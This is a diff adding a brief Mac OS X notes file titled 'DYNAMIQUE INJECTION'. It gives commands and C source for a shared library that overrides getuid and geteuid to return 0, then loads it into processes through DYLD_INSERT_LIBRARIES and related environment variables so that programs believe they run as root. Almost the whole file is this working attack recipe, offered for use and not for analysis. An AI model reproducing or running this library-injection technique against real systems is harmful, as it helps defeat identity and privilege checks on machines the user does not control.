@@ -1,0 +1,35 @@
+#######################  DYNAMIQUE INJECTION  ######################
+#
+# MACO SX
+
+# Check with id I have
+id
+
+# Create directory
+mkdir myuid_root
+cd myuid_root
+
+# create geteuid and getuid function
+vi myuid.c
+----
+int     getuid()
+{
+    return (0);
+}
+
+int     geteuid()
+{
+    return (0);
+}
+
+# Compile in shared lib the file
+gcc -shared -o myuid.so myuid.c
+
+# Change environment variable DYLD_LIBRARY_PATH
+setenv DYLD_LIBRARY_PATH .
+
+# Change env var DYLD_INSERT_LIBRARY to load our .so file
+setenv DYLD_INSERT_LIBRARIES myuid.so
+
+# Change env var DYLD_FORCE_FLAT_NANESPACE
+setenv DYLD_FORCE_FLAT_NAMESPACE 1
